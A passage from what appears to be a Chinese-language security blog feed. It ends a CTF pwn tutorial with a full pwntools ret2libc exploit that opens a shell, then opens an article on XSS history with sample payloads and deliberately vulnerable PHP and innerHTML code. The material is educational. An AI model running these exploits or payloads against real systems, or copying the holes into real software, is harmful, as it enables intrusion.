p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x00\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n<p>果然成功了，再來一次：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/thelib-again.png\" /><figcaption><p>main again!</p>\n</figcaption></figure></p>\n<p>再來就是要最關鍵的開 shell 方程式！我們要用第二次的 ROP chain 創造出 <code>system('/bin/sh');</code>，因此需要先知道 <code>puts()</code> 在提供的 libc 中的位置，進而算出 <code>system()</code> 在哪。同時，還要找到 <code>'/bin/sh'</code> 字串的位置，能用 libc 當然最好，沒有的話就要自己想辦法寫入記憶體中。</p>\n<p>不同版本跟 distribution 的 linux 會用到不同的 libc，而不同的 libc 中函數與變數的 offset 也不同，所以要準確知道目標系統上運行的 libc 版本才能計算出對的地址。這題之所以附上一個 libc .so 檔也就是為了讓我們可以從 libc 版本明確算出函數位置。如果沒有附的話，通常也可以透過其他檔案，例如 Dockerfile 用的 image 來推論，然後用一些線上的資料庫查詢 offset：<a href=\"https://libc.blukat.me/\">libc database search</a>、<a href=\"https://libc.rip/\">libc.rip</a>、<a href=\"https://libc.nullbyte.cat/\">libc nullbyte</a></p>\n<p>要知道 libc 中函數位置也有手動跟 pwntools 兩種方式。</p>\n<p>手動的話可以用 <code>readelf</code> 來查詢：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/thelib-offset.png\" /><figcaption><p>libc offset</p>\n</figcaption></figure></p>\n<p>用 pwntools 的話簡單一些：</p>\n<pre class=\"language-python\"><code class=\"language-python\">libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc-2.31.so\"</span><span class=\"token punctuation\">)</span><br>libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x00\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span> <br><br>system <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span><br>exit <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">]</span><br>binsh <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </code></pre>\n<p>萬事俱備，只欠東風，ROP chain 兜起來看看（<code>exit()</code> 只是讓開的 shell 可以優雅結束，沒有其實也沒關係）。記得 local 測試的時候要把 libc 換成自己的，可以用 <code>ldd the_library</code> 找到對應的 <a href=\"http://libc.so\">libc.so</a>，然後替換掉剛剛在 pwntools 設定的 ELF：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># use YOUR local libc!!</span><br><span class=\"token comment\"># ldd the_library: libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e17b29000)</span><br>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><br>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">552</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>poprdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>exit<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>完成啦！跑起來看看！</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/thelib-align.png\" /><figcaption><p>alignment</p>\n</figcaption></figure></p>\n<p>咦，怎麼又是 EOF 然後 segfault？</p>\n<p>在 64 bit 的環境呼叫 libc 函數，例如 <code>system()</code> <code>printf()</code> 的時候，如果記憶體沒有 16 byte 對齊，就會在 <code>movaps</code> 指令發生 segfault。你可以在 gdb 裡跟進看看執行到 <code>system()</code> 的時候 <code>rsp</code> 尾數是不是 0 ，不是的話就表示現在的 stack 並不符合 alignment。更多常見的小陷阱可以參考這個很棒的 ROP 教學網站：<a href=\"https://ropemporium.com/guide.html#Common%20pitfalls\">ROP Emporium</a></p>\n<p>要修復這個問題很簡單，我們可以在前面加一個 <code>ret;</code> 的 gadget，等效做一次 nop 把後面的 ROP chain 往後推一格，這樣跑到 <code>system()</code> 就會是對齊的狀態啦！</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/thelib-flag.png\" /><figcaption><p>get SHELL</p>\n</figcaption></figure></p>\n<p>exploit 如下：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span><br><br>context<span class=\"token punctuation\">.</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><br><br>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./the_library'</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">#p= remote('challenge.ctf.games', 31125)</span><br><br>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'the_library'</span><span class=\"token punctuation\">)</span><br>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">#libc = ELF(\"libc-2.31.so\")</span><br><br><span class=\"token comment\"># poprdi gadget: 0x00401493 : (b'5fc3')\tpop rdi; ret</span><br>poprdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00401493</span><br>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0040101a</span><br><br><span class=\"token comment\"># leak libc_base</span><br>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><br>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><br>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span><br>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">552</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>poprdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><br><br>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x00\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span> <br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>system <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span><br>exit <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">]</span><br>binsh <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <br><br>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">552</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>poprdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <br>p<span class=\"token punctuation\">.</span>clean<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>目前介紹了 stack 題的幾個基本概念，讓大家初探 pwn 世界的奧妙與神奇。Buffer overflow 這個看似簡單的漏洞造成的危害可能是非常致命的，大家可以想想自己的程式中有沒有用到危險的函數、使用者的輸入有沒有做好檢查。</p>\n<p>覺得 pwn 有趣的話，推薦大家可以去玩 <a href=\"https://pwnable.tw/\">pwntable.tw</a> 上的題目！</p>\n",
      "date_published": "2021-10-21T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/xss-history/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/xss-history/",
      "title": "XSS 從頭談起：歷史與由來",
      "content_html": "<p>我以前有寫過一些關於 XSS 的文章，主要在談的是實作面的防範以及防禦的各個細節：</p>\n<ol>\n<li><a href=\"https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/\">防止 XSS 可能比想像中困難</a></li>\n<li><a href=\"https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/\">淺談 XSS 攻擊與防禦的各個環節</a></li>\n</ol>\n<!-- summary -->\n<p>這篇原本想寫的是 XSS 的基礎，就大家都聽過的那三種類別：Stored(Persistent)、Reflected(Non-Persistent) 以及 DOM-based XSS，但當我正要開始寫的時候，腦中突然浮現了幾個問題：「XSS 是什麼時候出現的？這三種類別又是什麼時候開始被分類的？」</p>\n<p>因此，我花了點時間找了一些資料，這篇文章會跟大家談談 XSS 的歷史，讓我們一起更了解 XSS 的前世今生。</p>\n<!-- summary -->\n<h2 id=\"xss-%E7%9A%84%E8%AA%95%E7%94%9F\"><a class=\"direct-link\" href=\"#xss-%E7%9A%84%E8%AA%95%E7%94%9F\">#</a> XSS 的誕生</h2>\n<p>從微軟的 MSDN blog 在 2009 年 12 月發佈的文章標題：<a href=\"https://web.archive.org/web/20100723152801/http://blogs.msdn.com/b/dross/archive/2009/12/15/happy-10th-birthday-cross-site-scripting.aspx\">Happy 10th birthday Cross-Site Scripting!</a> 中就可以看出 XSS（Cross-Site Scripting）這個名詞約莫是 1999 年 12 月誕生的，離現在已經 20 幾年了。</p>\n<p>（下圖為上面連結的截圖）</p>\n<p><img src=\"/img/posts/huli/xss-history/xss-10years.png\" alt=\"xss-history\"></p>\n<p>原文最後有這麼一段話：</p>\n<blockquote>\n<p>Let's hope that ten years from now we'll be celebrating the death, not the birth, of Cross-Site Scripting!</p>\n</blockquote>\n<p>很遺憾的，2009 年的 10 年後，也就是 2019 年，XSS 依舊持續活躍著，在 2017 年的 OWASP top 10 排在第七名，2021 的版本則併入第三名 Injection 的類別。</p>\n<p>而文中提到的：<a href=\"https://web.archive.org/web/20100516115740/http://www.cert.org/advisories/CA-2000-02.html\">CERT® Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests</a>，可以讓我們一窺最早期 XSS 的面貌。底下就讓我們簡單看一下這個網頁的內容：</p>\n<blockquote>\n<p>A web site may inadvertently include malicious HTML tags or script in a dynamically generated page based on unvalidated input from untrustworthy sources. This can be a problem when a web server does not adequately ensure that generated pages are properly encoded to prevent unintended execution of scripts, and when input is not validated to prevent malicious HTML from being presented to the user.</p>\n</blockquote>\n<p>在 Overview 的部分其實就把 XSS 的核心概念講得非常清楚了，server 沒有驗證輸入或是編碼，導致攻擊者可以插入一些惡意的 HTML 標籤或是 script。</p>\n<blockquote>\n<p>Malicious code provided by one client for another client</p>\n<p>Sites that host discussion groups with web interfaces have long guarded against a vulnerability where one client embeds malicious HTML tags in a message intended for another client. For example, an attacker might post a message like <code>Hello message board. This is a message.&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;This is the end of my message.</code></p>\n<p>When a victim with scripts enabled in their browser reads this message, the malicious code may be executed unexpectedly. Scripting tags that can be embedded in this way include <code>&lt;SCRIPT</code>&gt; <code>&lt;OBJECT&gt;</code>, <code>&lt;APPLET&gt;</code>, and <code>&lt;EMBED&gt;</code>.</p>\n<p>When client-to-client communications are mediated by a server, site developers explicitly recognize that data input is untrustworthy when it is presented to other users. Most discussion group servers either will not accept such input or will encode/filter it before sending anything to other readers.</p>\n</blockquote>\n<p>這一段則是後來被稱為「Stored XSS（也稱為 Persistent XSS）」的分類，假設有一個討論區可以讓人留言，一個惡意的攻擊者可以留這樣的內容：</p>\n<pre class=\"language-html\"><code class=\"language-html\">Hello message board. This is a message.<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SCRIPT</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">malicious code</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>SCRIPT</span><span class=\"token punctuation\">></span></span><br>This is the end of my message.</code></pre>\n<p>當其他使用者看到這篇留言的時候，因為留言裡面有 <code>&lt;script&gt;</code> ，所以就會執行攻擊者所留下的 JavaScript 程式碼。</p>\n<p>除了這個以外，<code>&lt;object&gt;</code>、<code>&lt;applet&gt;</code> 跟 <code>&lt;embed&gt;</code> 也都可以用來執行 JavaScript（話說 applet 這標籤應該已經沒用了，可參考：<a href=\"https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/\">Don’t break the Web：以 SmooshGate 以及 keygen 為例 </a>）。</p>\n<blockquote>\n<p>Malicious code sent inadvertently by a client for itself</p>\n<p>Many Internet web sites overlook the possibility that a client may send malicious data intended to be used only by itself. This is an easy mistake to make. After all, why would a user enter malicious code that only the user will see?</p>\n<p>However, this situation may occur when the client relies on an untrustworthy source of information when submitting a request. For example, an attacker may construct a malicious link such as <code>&lt;A HREF=&quot;http://example.com/comment.cgi? mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;&quot;&gt; Click here&lt;/A&gt;</code></p>\n<p>When an unsuspecting user clicks on this link, the URL sent to <a href=\"http://example.co\">example.co</a> includes the malicious code. If the web server sends a page back to the user including the value of mycomment, the malicious code may be executed unexpectedly on the client. This example also applies to untrusted links followed in email or newsgroup messages.</p>\n</blockquote>\n<p>這一段就很有趣了，標題是：「Malicious code sent inadvertently by a client for itself」，發送的內容基本上只有自己能看到。</p>\n<p>例如說網址中 mycomment 這個參數會反映到畫面上，所以像是 <code>http://example.com/comment.cgi?mycomment=123</code>，畫面上面就會出現 123。</p>\n<p>但只有自己能看到能做什麼呢？</p>\n<p>因為是透過網址上的 query string 來傳遞資訊，因此可以產生這樣的一個連結：<code>http://example.com/comment.cgi?mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;</code>，接著再把這個連結傳給其他人，當其他人點了以後，畫面上就會出現 <code>&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;</code>，照樣達成 XSS。</p>\n<p>這就是 XSS 的另外一種分類：Reflected XSS，你的輸入會反映在畫面上。</p>\n<p>而這兩種的差別在於 Stored XSS 就像它的名字一樣，XSS payload 是被保存住的，以討論區來說，文章是保存在資料庫中的，而 Reflected XSS 則不然。</p>\n<p>以 PHP 為例，Reflected XSS 的程式碼可能會像這樣：</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br>   <span class=\"token variable\">$comment</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'comment'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><span class=\"token delimiter important\">?></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span> <span class=\"token variable\">$comment</span> <span class=\"token delimiter important\">?></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>把 GET 的參數直接反映在畫面上，所以每一次都必須透過 comment 這個參數把 payload 傳進去，否則不會觸發 XSS。</p>\n<p>以上面提的「討論區」這個網站為例，Stored XSS 的破壞力應該是更強大的，因為只要點進去你這篇文章就會中招，可以想成你在 ptt 發了一篇文章，只要有鄉民點進來文章就會被攻擊，還滿容易觸發的。</p>\n<p>但 Reflected XSS 就不太一樣了，這需要使用者點擊連結才會出事，像是你在 ptt 推文留了一個連結，鄉民要主動點那個連結才能觸發 XSS。</p>\n<p>文中的其他部分也很有趣，例如說也有提到僅管把 JavaScript disabled，依然可以用 HTML 與 CSS 去竄改畫面等等，也有提到修補方式，在這邊：<a href=\"https://web.archive.org/web/20100527204457/http://www.cert.org/tech_tips/malicious_code_mitigation.html\">Understanding Malicious Content Mitigation for Web Developers</a></p>\n<p>修補方式除了我們熟悉的針對內容編碼以外，還有另一個是要「指定編碼方式」，這邊的編碼指的是 UTF-8 或是 ISO-8859-1 以及 big5 這種編碼。雖然說現在這個年代絕大部分網站都是 UTF-8 了，但早期其實不然。在以往瀏覽器還支援像是 UTF-7 這樣的編碼方式，就算不用一些特殊字元也可以達成 XSS：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>test page<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  +ADw-script+AD4-alert(1)+ADw-/script+AD4-<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>範例取自：<a href=\"https://wooyun.js.org/drops/XSS%E5%92%8C%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.html\">XSS 和字符集的那些事兒</a>，裡面有提到更多這種類似的問題，但大多數問題應該都發生在比較早期的瀏覽器上面。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E7%A8%AE-xss-%E5%88%86%E9%A1%9E%E7%9A%84%E8%AA%95%E7%94%9F\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E7%A8%AE-xss-%E5%88%86%E9%A1%9E%E7%9A%84%E8%AA%95%E7%94%9F\">#</a> 第三種 XSS 分類的誕生</h2>\n<p>有看過 XSS 文章的人都知道，最廣為人知的 XSS 分類大概就三種：</p>\n<ol>\n<li>Stored XSS（Persistent XSS）</li>\n<li>Reflected XSS（Non-Persistent XSS）</li>\n<li>DOM-based XSS</li>\n</ol>\n<p>再繼續往下之前，我先來問問看大家兩個問題。</p>\n<p>第一個問題，假設現在我發了一篇文章，內容為 <code>&lt;img src=x onerror=alert(1)&gt;</code>，而顯示文章的頁面程式碼是這樣的：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  <span class=\"token function\">getPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> id<span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">post</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.article'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> post<span class=\"token punctuation\">.</span>content<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>因為用了 innerHTML 的緣故，所以就有了一個 XSS 漏洞，在這個狀況之下，我的留言確實有「保存」在資料庫，但也同時用了 DOM 去改變內容，那這個 XSS 應該被歸類在 Stored XSS，還是 DOM-based XSS？</p>\n<p>第二個問題，假設網頁中有一段程式碼長這樣：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".search\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token function\">decodeURIComponent</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">)</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這顯然可以透過 query string 製造出一個 XSS 漏洞，這個 XSS 確實反映了使用者的輸入，而且沒有被儲存在資料庫裡面，不過卻是用 DOM 去改變內容，那它應該是 Reflected XSS，還是 DOM-based XSS？</p>\n<p>在繼續往下閱讀之前，大家可以先想一下上面這兩個問題。</p>\n<p>先來講講我以前的答案，我之前是用下面的定義來分類這幾個的：</p>\n<ol>\n<li>我的 XSS payload（例如說 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>）如果有存在資料庫，那就是 Stored XSS</li>\n<li>如果不是，那就看我的 payload 是直接從後端輸出，還是透過 DOM 去賦值，前者就是 Reflected，後者就是 DOM-based</li>\n</ol>\n<p>後來我才發現這個分類方式是錯誤的，因為我被「stored」這個名詞誤導了，沒有意識到這背後的歷史背景。</p>\n<p>這是什麼意思呢？在 1999 年 XSS 剛出來的時候，Ajax 還不存在（它是 2005 年才誕生的），所以前後端的資料交換應該都是透過表單送去 Server，並且直接把回應 render 出來。</p>\n<p>換句話說，在 1999 年的時候，基本上沒有什麼操作是用 JavaScript 去更改畫面內容的，就算有，也是一些比較無關緊要的操作。但在 2021 年都不一樣了，在這個 SPA 盛行的年代，基本上都是透過 JavaScript 去呼叫 API，拿到資料以後再去更改畫面，後端只負責提供資料，前端靠著 JavaScript 來 render，這跟 20 年前完全不同。</p>\n<p>XSS 的三種分類之中，前兩種 Stored 以及 Reflected 在 XSS 誕生之時就已經存在了，而第三種則晚了五年才出現（這邊的「出現」指的是有個名詞或分類來定義它，而不是指攻擊出現），出處應該是這一篇：<a href=\"http://www.webappsec.org/projects/articles/071105.shtml\">DOM Based Cross Site Scripting or XSS of the Third Kind</a></p>\n<p>文中的 Introduction 有這樣一個段落：</p>\n<blockquote>\n<p>XSS is typically categorized into “non-persistent” and “persistent” (“reflected” and “stored” accordingly, as defined in [4]). “Non-persistent” means that the malicious (Javascript) payload is echoed by the server in an immediate response to an HTTP request from the victim. “Persistent” means that the payload is stored by the system, and may later be embedded by the vulnerable system in an HTML page provided to a victim.</p>\n</blockquote>\n<p>重點是 Stored 跟 Reflected 這兩個分類都有一個前提：「payload 是由後端直接 render 的」，而這篇文章所提到的第三個分類 DOM-based，指的則是「payload 是由前端 render 出來的」，這就是第三種與前兩種的最大差異。</p>\n<p>在判別 XSS 的時候，應該先確認的其實是「payload 是前端還是後端 render？」，如果是前端 render 出來，不論資料從哪裡來（從資料庫或是網址或任何地方都可以），就是 DOM-based XSS。如果是後端 render 出來，才去區分是 Stored 還是 Reflected。</p>\n<p>因此，剛剛那兩個問題因為都是前端 render 的關係，都會被歸類在 DOM-based XSS。</p>\n<p>上面的文章中就有舉一個類似的例子：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>HTML</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>TITLE</span><span class=\"token punctuation\">></span></span>Welcome!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>TITLE</span><span class=\"token punctuation\">></span></span><br>Hi<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SCRIPT</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br><span class=\"token keyword\">var</span> pos<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span><br>document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">,</span>document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>SCRIPT</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BR</span><span class=\"token punctuation\">></span></span><br>Welcome to our system<br>…<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>HTML</span><span class=\"token 